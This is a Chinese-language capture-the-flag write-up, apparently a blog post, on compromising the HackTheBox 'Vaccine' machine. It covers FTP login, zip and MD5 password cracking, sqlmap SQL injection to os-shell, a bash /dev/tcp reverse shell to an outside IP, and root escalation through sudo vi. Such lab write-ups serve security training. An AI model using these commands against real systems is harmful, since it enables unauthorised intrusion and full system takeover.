# 原创
：  HackTheBox-Vaccine

# HackTheBox-Vaccine

#### HackTheBox-Vaccine

## 连接配置

> 
参考之前写的连接配置，[文章链接](https://blog.csdn.net/LYJ20010728/article/details/119116747?spm=1001.2014.3001.5502)


## 信息搜集

> 
使用nmap对场景给出的ip地址进行扫描


```
nmap -sS -A 10.10.10.46 

```

> 
发现其开放了21、22和80端口，利用[上一场景](https://blog.csdn.net/LYJ20010728/article/details/119119559?spm=1001.2014.3001.5502)得到的FTP用户凭据 `ftpuser/mc@F1l3ZilL4`，尝试登陆FTP服务


## 登录FTP

```
ftp 10.10.10.46
Name:ftpuser
Password:mc@F1l3ZilL4

```

> 
登陆后利用 `dir`命令列出所有的文件，发现存在 backup.zip 压缩包，利用 `get`命令下载下来


> 
发现下载下来的 backup.zip 是加密的，尝试利用 Kali 中的 john 来破解压缩包密码


## 破解压缩包密码

> 
首先生成压缩包的hash值


```
zip2john backup.zip &gt; hash

```

> 
利用 Kali 中自带的字典 `rockyou.txt`，将 rockyou.txt.gz 复制到桌面上并用 `gzip`解压缩


> 
使用 `john`来指定字典破解密码


```
john hash --fork=4 -w rockyou.txt 2&gt;/dev/null
--fork=4:4个进程
-w:指定字典路径
2&gt;/dev/null:将错误输出到黑洞(不显示)

```

> 
John破解得到压缩包密码：`741852963`


> 
利用 `unzip`解压 backup.zip得到 index.php 以及 style.css


## 获取登录密码

> 
查看 index.php 发现存在 admin账户以及其密码的MD5值


> 
利用网站在线破解一下这串hash值，[网站链接](https://www.cmd5.com/)，得到密码为：`qwerty789`


## 登录网站

> 
利用 `admin/qwerty789` 登录网站


> 
查看一下网站发现处于右上角的搜索框之外并没有什么利用点，在搜索框随便输入点内容，利用burp suite抓个包将内容保存下来


> 
利用sqlmap进行测试


```
sqlmap -r Vaccine.txt 

```

> 
发现确实存在注入点，并且后台数据库为PostgreSQL


## getshell

> 
由于是sql注入点，采用 `--os-shell` 来getshell


> 
先起一个监听


```
nc -nvvlp 1234

```

> 
然后在 `os-shell` 中输入 `bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.53/1234 0&gt;&amp;1'` 来反弹shell


## 升级shell

> 
将升级 shell 升级为 tty，得到一个交互式的shell


> 
查找文件发现/var/www/html目录下的dashboard.php存在当前用户postgres的密码`P@s5w0rd!`


## 提权

> 
验证用户密码查看自己当前的权限


```
sudo -l

```

> 
发现用户被允许编辑配置文件 `/etc/postgresql/11/main/pg_hba.conf`，可以利用vi并验证密码提权至root<br/> 进入vi界面后可能会界面重叠，直接输入`:!/bin/bash`再点击回车即可，输入`whoami`发现已经成功提权为root


> 
进入`/root`目录下，查看 root.txt 文件，即可拿到SYSTEM OWN的Flag

